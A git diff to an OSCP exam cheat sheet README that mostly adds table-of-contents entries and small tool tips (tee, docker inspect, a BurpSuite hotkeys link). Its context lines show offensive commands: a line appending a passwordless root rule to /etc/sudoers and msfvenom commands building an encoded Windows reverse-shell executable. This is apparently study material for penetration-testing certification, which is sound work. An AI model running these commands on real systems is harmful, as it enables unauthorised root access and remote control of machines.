@@ -6,6 +6,8 @@ This repository describes cheat sheet and knowledge for OSCP.
 <!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
 **Table of Contents**
 
+- [oscp-cheatsheet](#oscp-cheatsheet)
+- [Contents](#contents)
 - [Enumeration](#enumeration)
   - [Network](#network)
     - [nmap](#nmap)
@@ -44,7 +46,7 @@ This repository describes cheat sheet and knowledge for OSCP.
         - [bitquark-subdomains-top100000.txt](#bitquark-subdomains-top100000txt)
 - [JWT (JSON Web Token) exploit](#jwt-json-web-token-exploit)
     - [Debugger](#debugger)
-    - [jwt_tool](#jwt_tool)
+    - [jwt\_tool](#jwt_tool)
       - [tampering](#tampering)
       - [exploit](#exploit)
 - [SSTI (Server-Side Template Injection)](#ssti-server-side-template-injection)
@@ -65,7 +67,10 @@ This repository describes cheat sheet and knowledge for OSCP.
     - [Run command as other user](#run-command-as-other-user)
     - [Show file type](#show-file-type)
     - [Show the strings of printable characters in files](#show-the-strings-of-printable-characters-in-files)
+    - [Read from standard input and write to standard output and files](#read-from-standard-input-and-write-to-standard-output-and-files)
   - [Disable password checking for sudo](#disable-password-checking-for-sudo)
+  - [Docker](#docker)
+    - [Get a subsection in JSON format](#get-a-subsection-in-json-format)
   - [SUID](#suid)
   - [DNS](#dns)
     - [Specify referred DNS server](#specify-referred-dns-server)
@@ -97,6 +102,8 @@ This repository describes cheat sheet and knowledge for OSCP.
     - [Windows](#windows)
       - [exe](#exe)
       - [exe-service](#exe-service)
+  - [BurpSuite](#burpsuite)
+    - [Hot Keys](#hot-keys)
 - [Others](#others)
   - [References for OSCP](#references-for-oscp)
     - [GTFOBins](#gtfobins)
@@ -334,9 +341,21 @@ file <file name>
 strings <file name>
 ```
 
+### Read from standard input and write to standard output and files
+```
+echo <text> | tee -a <file>
+```
+
 ## Disable password checking for sudo
 ```
 echo "<username> ALL=(root) NOPASSWD: ALL" >> /etc/sudoers
+```
+
+## Docker
+### Get a subsection in JSON format
+https://docs.docker.com/reference/cli/docker/inspect/
+```
+docker inspect --format='{{json .Config}}' $INSTANCE_ID
 ```
 
 ## SUID
@@ -454,6 +473,10 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -e x86/shikata
 ```
 msfvenom -p windows/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -e x86/shikata_ga_nai -f exe-service -o evil.exe
 ```
+
+## BurpSuite
+### Hot Keys
+https://github.com/rinetd/BurpSuite-1/blob/master/CheatSheet.md
 
 # Others
 
